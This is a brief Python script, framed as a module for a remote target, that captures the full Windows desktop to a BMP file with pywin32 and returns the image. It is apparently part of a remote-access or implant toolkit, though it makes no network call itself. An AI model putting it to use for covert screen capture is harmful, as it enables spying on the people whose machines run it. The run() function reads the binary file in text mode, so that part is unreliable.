'''
A script that will take a screenshot on the remote target.
I don't know a lot about these, so inform me if you saw something wrong.
'''
# Import needed packages
import base64  # Encoder
import win32api  # Windows APIs
import win32con
import win32gui  # Windows GUI
import win32ui  # Windows UI


def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)


def screenshot(name='screenshot'):
    '''
    Take a screenshot.
    '''
    hdesktop = win32gui.GetDesktopWindow()  # Get the window part of the desktop
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()  # Take screenshot
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')  # Save screenshot as a bmp file

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def run():
    '''
    Run.
    '''
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img


if __name__ == '__main__':
    screenshot()
